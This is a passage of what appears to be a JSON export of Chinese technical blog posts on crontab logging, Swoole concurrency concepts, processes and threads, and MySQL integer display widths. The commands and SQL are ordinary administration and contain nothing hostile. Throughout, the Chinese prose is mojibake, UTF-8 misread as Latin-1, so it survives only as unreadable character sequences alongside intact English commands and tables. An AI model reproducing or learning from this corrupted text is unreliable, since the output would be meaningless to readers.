å¦‚æœæƒ³è¦ç¼–è¾‘/æŸ¥çœ‹/åˆ é™¤å…¶ä»–ç”¨æˆ·çš„ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1$ crontab -u &lt;username&gt; &lt;é€‰é¡¹&gt; å¸¸ç”¨é€‰é¡¹ï¼š-eï¼šç¼–è¾‘ä»»åŠ¡-lï¼šæŸ¥çœ‹ä»»åŠ¡-rï¼šåˆ é™¤ä»»åŠ¡ æŸ¥çœ‹ crontab ä»»åŠ¡æ‰§è¡Œæƒ…å†µå½“å®šæ—¶ä»»åŠ¡åœ¨æŒ‡å®šæ—¶é—´æ‰§è¡Œæ—¶ï¼Œä¼šåŒæ­¥è¾“å‡ºç±»ä¼¼æ—¥å¿—ï¼š 12$ tail -f &#x2F;var&#x2F;log&#x2F;syslogNov 19 12:47:01 gigabit CRON[14521]: (root) CMD (&#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php) æ­¤æ—¶å°±å¯ä»¥è‚¯å®šä»»åŠ¡è°ƒåº¦æ­£å¸¸ã€‚ ä¸Šé¢é‚£ç§æ–¹å¼ç¡®å®æœ‰æ•ˆï¼Œä½†æ˜¯å¹¶ä¸æ–¹ä¾¿ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼å‘¢ï¼Ÿ crontab é»˜è®¤æ²¡æœ‰ä»»åŠ¡çš„æ‰§è¡Œè®°å½•æ—¥å¿—ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼æ‰‹åŠ¨åˆ›å»ºæ—¥å¿—æ–‡ä»¶ã€‚ 10 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php &gt;&gt; &#x2F;var&#x2F;log&#x2F;cron.log 2&gt;&amp;1 åœ¨script.php è„šæœ¬æœ€åé¢å¢åŠ ä¸€æ¬¡è¾“å‡ºï¼Œè¿™æ ·æ¯æ¬¡æ‰§è¡Œå®Œè„šæœ¬å°±ä¼šå°†è¾“å‡ºé‡å®šå‘è‡³cron.log æ—¥å¿—æ–‡ä»¶äº†ã€‚ å‚è€ƒé“¾æ¥ crontabç”¨æ³•ä¸å®ä¾‹ 19. crontab å®šæ—¶ä»»åŠ¡ Linux Crontabå‘½ä»¤å®šæ—¶ä»»åŠ¡åŸºæœ¬è¯­æ³•ä¸æ“ä½œæ•™ç¨‹-VPS/æœåŠ¡å™¨è‡ªåŠ¨åŒ–","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Crontab","slug":"Crontab","permalink":"https://www.0x2beace.com/tags/Crontab/"}]},{"title":"Swoole å¸¸è§æ¦‚å¿µæ•´ç†","slug":"sorting-out-some-concepts-in-swoole","date":"2020-10-25T12:24:52.000Z","updated":"2020-11-07T08:11:48.092Z","comments":true,"path":"sorting-out-some-concepts-in-swoole/","link":"","permalink":"https://www.0x2beace.com/sorting-out-some-concepts-in-swoole/","excerpt":"Swoole æ˜¯ä¸€ä¸ªéå¸¸ä¼˜ç§€çš„PHP çš„åç¨‹é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡å¼•æ“ã€‚ åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ä¸€äº›æ–°æˆ–æ—§çš„æ¦‚å¿µï¼Œåœ¨æ­¤æ•´ç†ä¸€ä¸‹ã€‚","text":"Swoole æ˜¯ä¸€ä¸ªéå¸¸ä¼˜ç§€çš„PHP çš„åç¨‹é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡å¼•æ“ã€‚ åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ä¸€äº›æ–°æˆ–æ—§çš„æ¦‚å¿µï¼Œåœ¨æ­¤æ•´ç†ä¸€ä¸‹ã€‚ é•¿è¿æ¥/çŸ­è¿æ¥é•¿è¿æ¥ï¼š å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å»ºç«‹è¿æ¥åä¸è¿›è¡Œæ–­å¼€ï¼Œä¹‹åå®¢æˆ·ç«¯å†æ¬¡è®¿é—®è¿™ä¸ªæœåŠ¡å™¨ä¸Šçš„å†…å®¹æ—¶ï¼Œç»§ç»­ä½¿ç”¨è¿™ä¸€æ¡è¿æ¥é€šé“ã€‚çŸ­è¿æ¥ï¼š å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å»ºç«‹è¿æ¥ï¼Œå‘é€å®Œæ•°æ®åç«‹é©¬æ–­å¼€è¿æ¥ã€‚ä¸‹æ¬¡è¦å–æ•°æ®ï¼Œéœ€è¦å†æ¬¡å»ºç«‹è¿æ¥ã€‚ ä¸²è¡Œ/å¹¶è¡Œ/å¹¶å‘ä¸²è¡Œï¼šæ‰§è¡Œå¤šä¸ªä»»åŠ¡æ—¶ï¼Œå„ä¸ªä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œï¼Œå®Œæˆä¸€ä¸ªä¹‹åæ‰èƒ½è¿›è¡Œä¸‹ä¸€ä¸ªã€‚å¹¶è¡Œï¼šå¤šä¸ªä»»åŠ¡åœ¨åŒä¸€æ—¶åˆ»å‘ç”Ÿå¹¶æ‰§è¡Œã€‚å¹¶å‘ï¼šåŒä¸€æ—¶åˆ»éœ€è¦æ‰§è¡ŒN ä¸ªä»»åŠ¡ IOï¼ˆInput/Outputï¼Œè¾“å…¥è¾“å‡ºï¼‰åœ¨è®¡ç®—æœºä¸­ï¼Œè¾“å…¥ / è¾“å‡ºï¼ˆå³ IOï¼‰æ˜¯æŒ‡ä¿¡æ¯å¤„ç†ç³»ç»Ÿï¼ˆæ¯”å¦‚è®¡ç®—æœºï¼‰å’Œå¤–éƒ¨ä¸–ç•Œï¼ˆå¯ä»¥æ˜¯äººæˆ–å…¶ä»–ä¿¡æ¯å¤„ç†ç³»ç»Ÿï¼‰çš„é€šä¿¡ã€‚ è¾“å…¥æ˜¯æŒ‡ç³»ç»Ÿæ¥æ”¶çš„ä¿¡å·æˆ–æ•°æ®ï¼Œè¾“å‡ºæ˜¯æŒ‡ä»ç³»ç»Ÿå‘å‡ºçš„æ•°æ®æˆ–ä¿¡å·ã€‚ æ¶‰åŠåˆ°IO æ“ä½œçš„é€šå¸¸æœ‰ç£ç›˜ã€ç½‘ç»œã€æ–‡ä»¶ç­‰ã€‚ åŒæ­¥/å¼‚æ­¥åŒæ­¥å’Œå¼‚æ­¥æ˜¯ä¸€ç§æ¶ˆæ¯é€šä¿¡æœºåˆ¶ã€‚å…¶å…³æ³¨ç‚¹åœ¨äº è¢«è°ƒç”¨è€…è¿”å› å’Œ ç»“æœè¿”å› ä¹‹é—´çš„å…³ç³»ï¼Œ æè¿°å¯¹è±¡æ˜¯è¢«è°ƒç”¨å¯¹è±¡çš„è¡Œä¸ºã€‚ åŒæ­¥ï¼šåœ¨å‘å‡ºä¸€ä¸ªåŒæ­¥è°ƒç”¨åï¼Œæ²¡æœ‰å¾—åˆ°ç»“æœè¿”å›ä¹‹å‰ï¼Œè¯¥è°ƒç”¨å°±ä¸ä¼šè¿”å›ï¼Œåªæœ‰ç­‰å¾…ç»“æœè¿”å›ä¹‹åæ‰ä¼šç»§ç»­æ‰§è¡Œåç»­æ“ä½œã€‚å¼‚æ­¥ï¼šå‘å‡ºè°ƒç”¨ï¼Œç›´æ¥è¿”å›ã€‚å¼‚æ­¥å¯ä»¥é€šè¿‡çŠ¶æ€ã€å›è°ƒã€é€šçŸ¥è°ƒç”¨è€…ç»“æœï¼Œå¯ä»¥å…ˆæ‰§è¡Œå…¶ä»–æ“ä½œï¼Œç›´åˆ°å›è°ƒç»“æœè¿”å›ä¹‹åï¼Œå†å›æ¥æ‰§è¡Œå›è°ƒé‚£éƒ¨åˆ†çš„æ“ä½œã€‚ é˜»å¡/éé˜»å¡é˜»å¡å’Œéé˜»å¡æ˜¯ä¸€ç§ä¸šåŠ¡æµç¨‹å¤„ç†æ–¹å¼ã€‚å…³æ³¨ç‚¹åœ¨äºè°ƒç”¨å‘ç”Ÿæ—¶ è°ƒç”¨è€…çŠ¶æ€ å’Œ è¢«è°ƒç”¨è€…è¿”å›ç»“æœ ä¹‹é—´çš„å…³ç³»ã€‚ æè¿°çš„æ˜¯ç­‰å¾…ç»“æœæ—¶å€™è°ƒç”¨è€…çš„çŠ¶æ€ã€‚ æ­¤æ—¶ç»“æœå¯èƒ½æ˜¯åŒæ­¥è¿”å›çš„ï¼Œä¹Ÿèƒ½æ˜¯å¼‚æ­¥è¿”å›ã€‚ é˜»å¡ï¼šåœ¨ç»“æœè¿”å›ä¹‹å‰ï¼Œè¯¥çº¿ç¨‹ä¼šè¢«æŒ‚èµ·ï¼Œåç»­ä»£ç åªæœ‰åœ¨ç»“æœè¿”å›åæ‰èƒ½æ‰§è¡Œã€‚éé˜»å¡ï¼šåœ¨ä¸èƒ½ç«‹åˆ»è·å–ç»“æœå‰ï¼Œè¯¥è°ƒç”¨ä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ã€‚ åŒæ­¥é˜»å¡/éåŒæ­¥é˜»å¡å®é™…ç¼–ç¨‹ä¸­ï¼Œé€šè¿‡çº¿ç¨‹å®ç°è¿›ç¨‹çš„åŒæ­¥éé˜»å¡ï¼Œé€šè¿‡åç¨‹å®ç°çº¿ç¨‹çš„åŒæ­¥éé˜»å¡ã€‚ åŒæ­¥é˜»å¡ï¼šæ‰“ç”µè¯é—®è€æ¿æœ‰æ²¡æœ‰æŸä¹¦ï¼ˆè°ƒç”¨ï¼‰ï¼Œè€æ¿è¯´æŸ¥ä¸€ä¸‹ï¼Œè®©ä½ åˆ«æŒ‚ç”µè¯ï¼ˆåŒæ­¥ï¼‰ï¼Œä½ ä¸€ç›´ç­‰å¾…è€æ¿ç»™ä½ ç»“æœï¼Œä»€ä¹ˆäº‹ä¹Ÿä¸åšï¼ˆé˜»å¡ï¼‰ã€‚ åŒæ­¥éé˜»å¡ï¼šæ‰“ç”µè¯é—®è€æ¿æœ‰æ²¡æœ‰æŸä¹¦ï¼ˆè°ƒç”¨ï¼‰ï¼Œè€æ¿è¯´æŸ¥ä¸€ä¸‹ï¼Œè®©ä½ åˆ«æŒ‚ç”µè¯ï¼ˆåŒæ­¥ï¼‰ï¼Œç­‰ç”µè¯çš„è¿‡ç¨‹ä¸­ä½ è¿˜ä¸€è¾¹å—‘ç“œå­ï¼ˆéé˜»å¡ï¼‰ã€‚ å¼‚æ­¥é˜»å¡/å¼‚æ­¥éé˜»å¡å¼‚æ­¥é˜»å¡ï¼šæ‰“ç”µè¯é—®è€æ¿æœ‰æ²¡æœ‰æŸä¹¦ï¼ˆè°ƒç”¨ï¼‰ï¼Œè€æ¿è¯´ä½ å…ˆæŒ‚ç”µè¯ï¼Œæœ‰äº†ç»“æœé€šçŸ¥ä½ ï¼ˆå¼‚æ­¥ï¼‰ï¼Œä½ æŒ‚äº†ç”µè¯åï¼ˆç»“æŸè°ƒç”¨ï¼‰, é™¤äº†ç­‰è€æ¿ç”µè¯é€šçŸ¥ç»“æœï¼Œä»€ä¹ˆäº‹æƒ…ä¹Ÿä¸åšï¼ˆé˜»å¡ï¼‰ã€‚ å¼‚æ­¥éé˜»å¡ï¼šæ‰“ç”µè¯é—®è€æ¿æœ‰æ²¡æœ‰æŸä¹¦ï¼ˆè°ƒç”¨ï¼‰ï¼Œè€æ¿è¯´ä½ å…ˆæŒ‚ç”µè¯ï¼Œæœ‰äº†ç»“æœé€šçŸ¥ä½ ï¼ˆå¼‚æ­¥ï¼‰ï¼Œä½ æŒ‚ç”µè¯åï¼ˆç»“æŸè°ƒç”¨ï¼‰ï¼Œä¸€éç­‰ç”µè¯ï¼Œä¸€éå—‘ç“œå­ã€‚ï¼ˆéé˜»å¡ï¼‰ å‚è€ƒé“¾æ¥ Swoole ä¸­æ¶‰åŠçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"åˆå§‹è¿›ç¨‹ä¸çº¿ç¨‹","slug":"initial-process-and-thread","date":"2020-10-24T13:50:46.000Z","updated":"2020-10-24T13:53:41.808Z","comments":true,"path":"initial-process-and-thread/","link":"","permalink":"https://www.0x2beace.com/initial-process-and-thread/","excerpt":"å…³äºè¿›ç¨‹å’Œçº¿ç¨‹ï¼Œæ­¤å‰å·²ç»æœ‰å¾ˆå¤šä¼˜ç§€çš„æ–‡ç« äº†ï¼Œè¿™é‡Œåªæ˜¯æŠ›ç –å¼•ç‰ï¼ŒåŸºäºè‡ªå·±çš„ç†è§£å¹¶æ•´ç†åŠ æ·±å°è±¡ã€‚","text":"å…³äºè¿›ç¨‹å’Œçº¿ç¨‹ï¼Œæ­¤å‰å·²ç»æœ‰å¾ˆå¤šä¼˜ç§€çš„æ–‡ç« äº†ï¼Œè¿™é‡Œåªæ˜¯æŠ›ç –å¼•ç‰ï¼ŒåŸºäºè‡ªå·±çš„ç†è§£å¹¶æ•´ç†åŠ æ·±å°è±¡ã€‚ æ“ä½œç³»ç»Ÿä¸‹çš„è¿›ç¨‹ä¸çº¿ç¨‹åœ¨æ­£å¼ä»‹ç»è¿›ç¨‹å’Œçº¿ç¨‹ä¹‹å‰ï¼Œä»æ“ä½œç³»ç»Ÿçš„è§’åº¦äº†è§£ä¸€ä¸‹ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œç°ä»£çš„æ“ä½œç³»ç»Ÿï¼ˆMac OS Xï¼ŒUNIXï¼ŒLinuxï¼ŒWindowsç­‰ï¼‰éƒ½æ˜¯æ”¯æŒâ€œå¤šä»»åŠ¡â€çš„æ“ä½œç³»ç»Ÿã€‚ é‚£ä¹ˆä»€ä¹ˆæ˜¯â€œå¤šä»»åŠ¡â€å‘¢ï¼Ÿç®€å•çš„è¯´ï¼Œå¤šä»»åŠ¡å°±æ˜¯åŒæ—¶è¿è¡Œå¤šä¸ªä»»åŠ¡ï¼Œæ¯”å¦‚ä¸€è¾¹å¬æ­Œï¼Œä¸€è¾¹å†™åšå®¢ã€‚ å¤šæ ¸ CPUå¯ä»¥ç›´æ¥åŒæ—¶è¿è¡Œå¤šä¸ªä»»åŠ¡ï¼Œè€Œå¯¹äºå•æ ¸ CPU æ¥è¯´ï¼Œåªèƒ½è®©ç³»ç»Ÿè½®æµæ‰§è¡Œæ¯ä¸ªä»»åŠ¡ï¼Œå› ä¸ºä»»åŠ¡ä¹‹é—´åˆ‡æ¢å¾ˆå¿«ï¼Œåœ¨å®è§‚ä¸Šçœ‹ä¸Šå»å°±æ˜¯åŒæ—¶æ‰§è¡Œçš„äº†ã€‚ å¯¹äºæ“ä½œç³»ç»Ÿæ¥è¯´ï¼Œä¸€ä¸ªä»»åŠ¡å°±æ˜¯ä¸€ä¸ªè¿›ç¨‹ã€‚è€Œæœ‰çš„è¿›ç¨‹åŒæ—¶åšå‡ ä»¶äº‹æƒ…ï¼Œä¹Ÿå°±æ˜¯åŒæ—¶è¿è¡Œå¤šä¸ªå­ä»»åŠ¡ï¼Œæˆ‘ä»¬æŠŠè¿›ç¨‹å†…çš„è¿™ç±»å­ä»»åŠ¡ç§°ä¸ºçº¿ç¨‹ã€‚ ç”±äºæ¯ä¸ªè¿›ç¨‹è‡³å°‘è¦å¹²ä¸€ä»¶äº‹æƒ…ï¼Œæ‰€ä»¥ï¼Œä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚ PHP é»˜è®¤æ˜¯æ‰§è¡Œå•ä»»åŠ¡çš„è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯åªæœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚å¦‚æœæˆ‘ä»¬è¦åŒæ—¶æ‰§è¡Œå¤šä¸ªä»»åŠ¡æ€ä¹ˆåŠï¼Ÿ æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š å¯åŠ¨å¤šä¸ªè¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹è™½ç„¶åªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†å¤šä¸ªè¿›ç¨‹å¯ä»¥ä¸€å—æ‰§è¡Œå¤šä¸ªä»»åŠ¡ã€‚ å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹å†…å¯åŠ¨å¤šä¸ªçº¿ç¨‹ï¼Œè¿™æ ·ï¼Œå¤šä¸ªçº¿ç¨‹ä¹Ÿå¯ä»¥ä¸€å—æ‰§è¡Œå¤šä¸ªä»»åŠ¡ã€‚ å¤šçº¿ç¨‹çº¿ç¨‹æ˜¯æœ€å°çš„æ‰§è¡Œå•å…ƒï¼Œè€Œè¿›ç¨‹ç”±è‡³å°‘ä¸€ä¸ªçº¿ç¨‹ç»„æˆï¼ŒçŸ¥é“è¿™ä¸€ç‚¹åï¼Œå†æ¥ç†è§£å¤šçº¿ç¨‹å°±ä¸éš¾äº†ã€‚ å¤šçº¿ç¨‹å°±æ˜¯æŒ‡ä¸€ä¸ªè¿›ç¨‹ä¸­åŒæ—¶æœ‰å¤šä¸ªçº¿ç¨‹æ­£åœ¨æ‰§è¡Œã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å¤šçº¿ç¨‹ï¼Ÿå¯¹äºä¸€ä¸ªç¨‹åºæ¥è¯´ï¼Œå¾ˆå¤šæ“ä½œäº‹éå¸¸è€—æ—¶çš„ï¼Œå¦‚æ•°æ®åº“I/Oæ“ä½œã€æ–‡ä»¶è¯»å†™ç­‰ã€‚å¦‚æœä½¿ç”¨å•çº¿ç¨‹ï¼Œé‚£ä¹ˆå°±åªèƒ½ç­‰å¾…è¯¥çº¿ç¨‹å¤„ç†å®Œè¿™äº›æ“ä½œä¹‹åï¼Œæ‰èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œå…¶ä»–æ“ä½œã€‚ è€Œå¦‚æœä½¿ç”¨å¤šçº¿ç¨‹ï¼Œå°±å¯ä»¥å°†è€—æ—¶çš„é‚£éƒ¨åˆ†æ“ä½œé€šè¿‡å…¶ä»–çº¿ç¨‹å»æ‰§è¡Œï¼Œä»è€Œæé«˜ç¨‹åºæ‰§è¡Œæ•ˆç‡ã€‚ å¤šçº¿ç¨‹çš„ç¼ºç‚¹ ä½¿ç”¨è¿‡å¤šçº¿ç¨‹ä¼šè¿‡åº¦æ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œå› ä¸ºåˆ›å»ºçº¿ç¨‹éœ€è¦å¼€è¾Ÿæ–°çš„å†…å­˜ã€‚ å½±å“ç³»ç»Ÿæ€§èƒ½ï¼Œæ“ä½œç³»ç»Ÿéœ€è¦æ¥å›å¯¹å¤šçº¿ç¨‹è¿›è¡Œåˆ‡æ¢ã€‚ åŒæ—¶è¿˜éœ€è¦è€ƒè™‘çº¿ç¨‹å¼‚å¸¸ï¼ˆæŒ‚èµ·ã€ä¸­æ­¢ï¼‰æ—¶å¯èƒ½ä¼šå¯¹é€ æˆç¨‹åºçš„å½±å“ã€‚ æ€»ç»“ï¼šå¤šçº¿ç¨‹æ˜¯å¼‚æ­¥çš„ï¼Œåˆ†åˆ«åˆ›å»ºN ä¸ªçº¿ç¨‹å¹¶ä¸èƒ½è¯´æ˜ä»–ä»¬å°±æ˜¯åœ¨åŒæ—¶è¿è¡Œï¼Œå®é™…ä¸Šæ˜¯æ“ä½œç³»ç»Ÿåœ¨å„ä¸ªçº¿ç¨‹ä¹‹é—´æ¥å›åˆ‡æ¢ï¼Œå¹¶ä¸”åˆ‡æ¢é€Ÿåº¦éå¸¸å¿«ï¼Œè¿™ä¹Ÿå°±é€ æˆäº†åœ¨å®è§‚ä¸Šç»™æˆ‘ä»¬åŒæ—¶è¿è¡Œçš„é”™è§‰ã€‚ å¤šè¿›ç¨‹å¤šè¿›ç¨‹å°±æ˜¯æŒ‡è®¡ç®—æœºåŒæ—¶æ‰§è¡Œå¤šä¸ªè¿›ç¨‹ã€‚ å¤šè¿›ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹ä¸‹é¢å¼•ç”¨ä¸€ä¸ªçŸ¥ä¹ä¸Šçš„å›ç­”ï¼Œéå¸¸é€šä¿—çš„è§£é‡Šäº†é€‰æ‹©å¤šè¿›ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹çš„é—®é¢˜ã€‚ å•è¿›ç¨‹å•çº¿ç¨‹ï¼šä¸€ä¸ªäººåœ¨ä¸€ä¸ªæ¡Œå­ä¸Šåƒèœã€‚ å•è¿›ç¨‹å¤šçº¿ç¨‹ï¼šå¤šä¸ªäººåœ¨åŒä¸€ä¸ªæ¡Œå­ä¸Šä¸€èµ·åƒèœã€‚ å¤šè¿›ç¨‹å•çº¿ç¨‹ï¼šå¤šä¸ªäººæ¯ä¸ªäººåœ¨è‡ªå·±çš„æ¡Œå­ä¸Šåƒèœã€‚ å¤šçº¿ç¨‹çš„é—®é¢˜æ˜¯å¤šä¸ªäººåŒæ—¶åƒä¸€é“èœçš„æ—¶å€™å®¹å™¨å‘ç”Ÿäº‰æŠ¢ã€‚ä¾‹å¦‚ä¸¤ä¸ªäººåŒæ—¶å¤¹ä¸€ä¸ªèœï¼Œä¸€ä¸ªäººåˆšä¼¸å‡ºç­·å­ï¼Œç»“æœä¼¸åˆ°çš„æ—¶å€™èœå·²ç»è¢«å¤¹èµ°äº†ã€‚é€šä¿—ç‚¹è¯´ä¹Ÿå°±è¯´èµ„æºå…±äº«å®¹å™¨å‘ç”Ÿå†²çªäº‰æŠ¢ã€‚ å¯¹äºWindows ç³»ç»Ÿæ¥è¯´ï¼Œâ€œå¼€æ¡Œå­â€çš„å¼€é”€å¾ˆå¤§ï¼Œå› æ­¤Windows é¼“åŠ±å¤§å®¶åœ¨ä¸€ä¸ªæ¡Œå­ä¸Šåƒèœã€‚å› æ­¤ Windows å¤šçº¿ç¨‹çš„å­¦ä¹ é‡ç‚¹æ˜¯èµ„æºäº‰æŠ¢ä¸åŒæ­¥æ–¹é¢çš„é—®é¢˜ã€‚ è€Œå¯¹äºLinux ç³»ç»Ÿæ¥è¯´ï¼Œâ€œå¼€æ¡Œå­â€çš„å¼€é”€å¾ˆå°ï¼Œå› ä¸ºLinux é¼“åŠ±å¤§å®¶å°½é‡æ¯ä¸ªäººéƒ½å¼€è‡ªå·±çš„æ¡Œå­åƒèœã€‚ä½†è¿™åŒäº‹ä¹Ÿå¸¦æ¥äº†æ–°çš„é—®é¢˜ï¼šä¸¤ä¸ªäººååœ¨ä¸åŒçš„æ¡Œå­ä¸Šï¼Œè¯´è¯ä¸æ–¹ä¾¿ã€‚å› ä¸ºï¼ŒLinux å¤šçº¿ç¨‹çš„å­¦ä¹ é‡ç‚¹æ˜¯è¿›ç¨‹ä¹‹é—´çš„é€šè®¯æ–¹å¼ã€‚ å‚è€ƒé“¾æ¥ è¿›ç¨‹å’Œçº¿ç¨‹ å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹çš„æ¦‚å¿µ å¤šçº¿ç¨‹æœ‰ä»€ä¹ˆç”¨ï¼Ÿâ€”â€”çŸ¥ä¹","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"çº¿ç¨‹","slug":"çº¿ç¨‹","permalink":"https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"MySQL Integerç±»å‹ä¸INT(11)è¯¦è§£","slug":"mysql-integer-type-and-int-11-detailed-explanation","date":"2020-10-23T10:39:10.000Z","updated":"2020-10-23T10:39:49.036Z","comments":true,"path":"mysql-integer-type-and-int-11-detailed-explanation/","link":"","permalink":"https://www.0x2beace.com/mysql-integer-type-and-int-11-detailed-explanation/","excerpt":"MySQLæ”¯æŒçš„æ•´æ•°ç±»å‹æœ‰TINYINTã€SMALLINTã€MEDIUMINTã€INTã€BIGINTã€‚","text":"MySQLæ”¯æŒçš„æ•´æ•°ç±»å‹æœ‰TINYINTã€SMALLINTã€MEDIUMINTã€INTã€BIGINTã€‚ æ¯ç§æ•´æ•°ç±»å‹æ‰€éœ€çš„å­˜å‚¨ç©ºé—´å’ŒèŒƒå›´å¦‚ä¸‹ï¼š|ç±»å‹|å­—èŠ‚|æœ€å°å€¼(æœ‰ç¬¦å·)|æœ€å¤§å€¼(æœ‰ç¬¦å·)|æœ€å°å€¼(æ— ç¬¦å·)|æœ€å¤§å€¼(æ— ç¬¦å·)||-|-|-|-|-|-||TINYINT|1|-128|127|0|255||SMALLINT|2|-32768|32767|0|65535||MEDIUMINT|3|-8388608|8388607|0|16777215||INT|4|-2147483648|2147483647|0|4294967295||BIGINT|8|-9223372036854775808|(9223372036854775807|0|18446744073709551615| æœ‰æ— é™åˆ¶çš„åŒºåˆ«åœ¨åˆ›å»ºæ•°æ®è¡¨æ—¶ï¼Œé€šå¸¸ä¼šçœ‹è§ int(11)å’Œintè¿™æ ·çš„å†™æ³•ï¼Œè¿™ä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå„è‡ªåˆä»£è¡¨ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ å¯¹åº”Integer ç±»å‹è€Œè¨€ï¼Œä»…è¡¨ç¤ºå­—æ®µçš„æ˜¾ç¤ºå®½åº¦ã€‚ å¯¹äºDECIMALç±»å‹ï¼Œè¡¨ç¤ºæ•°å­—çš„æ€»æ•°ã€‚ å¯¹äºå­—ç¬¦å­—æ®µï¼Œè¿™æ˜¯å¯ä»¥å­˜å‚¨çš„æœ€å¤§å­—ç¬¦æ•°ï¼Œä¾‹å¦‚VARCHARï¼ˆ20ï¼‰å¯ä»¥å­˜å‚¨20ä¸ªå­—ç¬¦ã€‚ æ˜¾ç¤ºå®½åº¦å¹¶ä¸å½±å“å¯ä»¥å­˜å‚¨åœ¨è¯¥åˆ—ä¸­çš„æœ€å¤§å€¼ã€‚int(3)å’Œint(11) æ‰€èƒ½å­˜å‚¨çš„æœ€å¤§èŒƒå›´æ˜¯ä¸€æ ·çš„ã€‚ å°†æŸä¸ªå­—æ®µè®¾ç½®æˆINT(20)å¹¶ä¸æ„å‘³ç€å°†èƒ½å¤Ÿå­˜å‚¨20ä½æ•°å­—ï¼Œè¿™ä¸ªå­—æ®µæœ€ç»ˆèƒ½å­˜å‚¨çš„æœ€å¤§èŒƒå›´è¿˜æ˜¯ INT çš„èŒƒå›´ã€‚ ç¤ºä¾‹åˆ›å»ºä¸€å¼ ä¸´æ—¶è¡¨ï¼š 12345CREATE TABLE tmp_table_a ( id INT(3) NOT NULL AUTO_INCREMENT, name varchar(16) DEFAULT &#39;&#39; NOT NULL, PRIMARY KEY (&#96;id&#96;)); æŸ¥çœ‹è¡¨ç»“æ„ï¼š 1234567mysql&gt; desc tmp_table_a;+-------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || name | varchar(16) | NO | | | |+-------+-------------+------+-----+---------+----------------+ æ’å…¥è¶…è¿‡â€é•¿åº¦â€çš„æ•°å­—ï¼š 1INSERT INTO tmp_table_a(id, name) VALUES(123456, &quot;boo&quot;); æŸ¥çœ‹ç»“æœï¼Œå‘ç°æ•°å­—å¹¶æ²¡æœ‰æ’å…¥å¤±è´¥ï¼š 1234567mysql&gt; select * from tmp_table_a;+--------+------+| id | name |+--------+------+| 123456 | boo |+--------+------+1 row in set (0.00 sec) æœ‰æ— ç¬¦å·çš„åŒºåˆ«é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ—¢ç„¶åŠ ä¸åŠ æ•°å­—å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜å¤šæ­¤ä¸€ä¸¾å‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºâ€œæ­£å¸¸â€æƒ…å†µä¸‹ç¡®å®æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåªæœ‰å½“å­—æ®µè®¾ç½®ä¸ºUNSIGNED ZEROFILL å±æ€§æ—¶ï¼Œä¸ºINT å¢åŠ æ•°å­—æ‰ä¼šæœ‰æ„ä¹‰ã€‚ è¡¨ç¤ºå¦‚æœè¦å­˜å‚¨çš„æ•°å­—å°‘äºN ä¸ªå­—ç¬¦ï¼Œåˆ™è¿™äº›æ•°å­—å°†åœ¨å·¦ä¾§è¡¥é›¶ã€‚ ç¤ºä¾‹åˆ›å»ºä¸€å¼  UNSIGNED ZEROFILL çš„æ•°æ®è¡¨ï¼š 12345CREATE TABLE tmp_table_b ( id INT(3) UNSIGNED ZEROFILL NOT NULL AUTO_INCREMENT, name varchar(16) DEFAULT &#39;&#39; NOT NULL, PRIMARY KEY (&#96;id&#96;)); æŸ¥çœ‹è¡¨ç»“æ„ï¼š 1234567mysql&gt; desc tmp_table_b;+-------+--------------------------+------+-----+---------+----------------+| 